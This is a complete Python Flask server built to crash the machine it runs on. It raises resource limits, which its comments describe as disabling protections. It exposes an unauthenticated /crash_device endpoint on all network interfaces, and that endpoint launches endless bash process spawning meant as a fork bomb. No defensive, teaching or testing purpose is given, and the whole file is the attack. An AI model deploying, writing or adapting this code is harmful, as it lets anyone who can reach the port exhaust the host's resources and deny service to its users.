from flask import Flask, request
import os
import warnings
import threading
import signal
import sys
import resource

app = Flask(__name__)
warnings.filterwarnings("ignore")

# Try to disable all protections
try:
    resource.setrlimit(resource.RLIMIT_NOFILE, (65536, 65536))
    resource.setrlimit(resource.RLIMIT_NPROC, (65536, 65536))
    resource.setrlimit(resource.RLIMIT_AS, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
    resource.setrlimit(resource.RLIMIT_MEMLOCK, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
except:
    pass

def start_crash():
    # Bypass normal resource checks
    while True:
        try:
            # Force fork without waiting
            os.spawnl(os.P_NOWAIT, "/bin/bash", "bash", "-c", 
                     "while true; do bash -c 'while true; do fork; done'; done")
        except:
            continue

@app.route('/crash_device', methods=['GET'])
def crash_device():
    thread = threading.Thread(target=start_crash)
    thread.daemon = True
    thread.start()
    return "Crash initiated!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
